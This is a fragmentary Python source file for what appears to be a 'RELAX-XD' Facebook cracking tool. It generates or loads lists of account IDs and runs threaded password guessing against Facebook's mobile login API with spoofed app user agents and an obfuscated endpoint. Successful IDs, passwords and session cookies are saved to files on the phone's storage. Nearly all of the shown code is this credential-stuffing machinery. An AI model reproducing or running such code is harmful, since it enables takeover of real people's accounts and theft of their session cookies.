...
def git():
    os.system("xdg-open https://github.com/MR-RELAX-707")
...
sys.stdout.write('\x1b]2; RELAX~XD\x07')
#===================[SERVER BOX]===========================
def gift___pro():
...
#===================[FILE M1]===========================
try:
    F1 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O\xcf,\xc9(M\xd2K\xce\xcf\xd5OK,JL\xca441\xd6w\xf5s\x0f\x8a\xd4O\xca\xc9O\xd2\xcfM\xcc\xcc\xd3\x0fM\xd4+\xa9(\x01\x00\xd1\xb3\x11\xb1'))
except:
...
{white}================================================
{red}[{white}√{red}]{green} DEVELOPER {white}▶ {green}︎MD SHIMUL
{red}[{white}√{red}]{green} TOOLTYPE {white} ▶︎{green} FREE {red}({green}FILE {white}& {green}RANDOM{red})
{red}[{white}√{red}]{green} GITHUB    {white}▶︎ https://github.com/MRSH4MUL
...
def ___RELAX___():
    ...
    line()
    __RELAX__ = input(f'{red}[{white}◆{red}]{green} Selection {white}:{yellow} ')
    if __RELAX__ in['A','a','01','1']:___FILE___()
    elif __RELAX__ in ['B','b','02','2']:___RANDOM___()
    elif __RELAX__ in ['C','c','03','3']:os.system('xdg-open ');___RELAX___()
    else:
...
def ___RANDOM___():
    ...
    elif error_ in ['F','f','06','6']:___RELAX___()
    else:___RANDOM___()
#====================[BD RANDOM]==========================
def ___BD___():
    clear()
    ...
    for x in range(limit):
        ...
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=40) as error:
        clear()
...
try:
    def __MTDONEE__(sid, name, psw,tl):
        try:
            global oks,cps,loop
            abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}RELAX-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                headers = {'User-Agent': '[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653414;FBDM/{density=2.0,width=720,height=1402};FBLC/en_US;FBRV/211387411;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S102DL;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}RELAX-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/RELAX-FILE-M1.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/RELAX-FILE-M1-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{red}[RELAX-CP] {sid} | {ps} ")
                     open('/sdcard/RELAX-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}RELAX-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/RELAX-FILE-M2.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/RELAX-FILE-M2-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\r{red}[RELAX-CP] {sid} | {ps} ")
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}RELAX-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/RELAX-FILE-M3.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/RELAX-FILE-M3-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                        ####print(f"\r\r{red}[RELAX-CP] {sid} | {ps} ")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}RELAX-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/RELAX-FILE-M4.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/RELAX-FILE-M4-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{red}[RELAX-CP] {sid} | {ps} ")
...
#====================[FILE M5]==========================
    ...
    'Content-Length': '847'
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}RELAX-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/RELAX-FILE-M5.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/RELAX-FILE-M5-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{red}[RELAX-CP] {sid} | {ps} ")
...
def __MTDONE6__(ids,names,passlist,tl):
    ...
    'Content-Length': '847'
            ...
            if 'session_key' in q:
                cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\r{red}[{white}√{red}] {red}[{green}RELAX-OK{red}] {green}{sid} {white}| {green}{ps} ")
                open('/sdcard/RELAX-FILE-M6.txt','a').write(sid+'|'+ps+'\n')
                open('/sdcard/RELAX-FILE-M6-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                oks.append(sid)
                break
            elif 'www.facebook.com' in q['error']['message']:
                #print(f"\r\r{red}[RELAX-CP] {sid} | {ps} ")
...
def randm(ids,psd,tl):
    ...
    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}RELAX-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    ua = '[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/273474118;FBCR/Airtle;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2481;FBSV/13;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
    try:
        for pas in psd:
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
...
def randm1(ids,psd,tl):
    ...
    try:
        for pas in psd:
            ...
            adid = str(uuid.uuid4())
            pas = rmpassconf(ids,pas)
            ua = '[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/256855919;FBCR/Airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E225F;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            data = {
            'adid':adid,
            'format':'json',
            'device_id':adid,
            ...
            if 'access_token' in q:
                ...
                print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ") 
                oks.append(ids)
                open('/sdcard/RELAX-M2-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
...
def randm2(ids,psd,tl):
    ...
    try:
        for pas in psd:
            ...
            'X-FB-connection-quality':'EXCELLENT',
            "X-Tigon-Is-Retry": "False",
            'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            ...
            url = "https:"+"//api.face"+"book.co"+"m/meth"+"od/a"+"uth.login"
            po = requests.post(url,data=data,headers=head).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                ...
                print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ") 
                oks.append(ids)
                open('/sdcard/RELAX-M3-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
        ...
        for pas in psd:
            ...
            if "c_user" in log_cookies:
                ...
                if 'Photoshop' in res:
                    ...
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                    oks.append(ids)
                    open('/sdcard/RELAX-M4-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    break
                else:pass
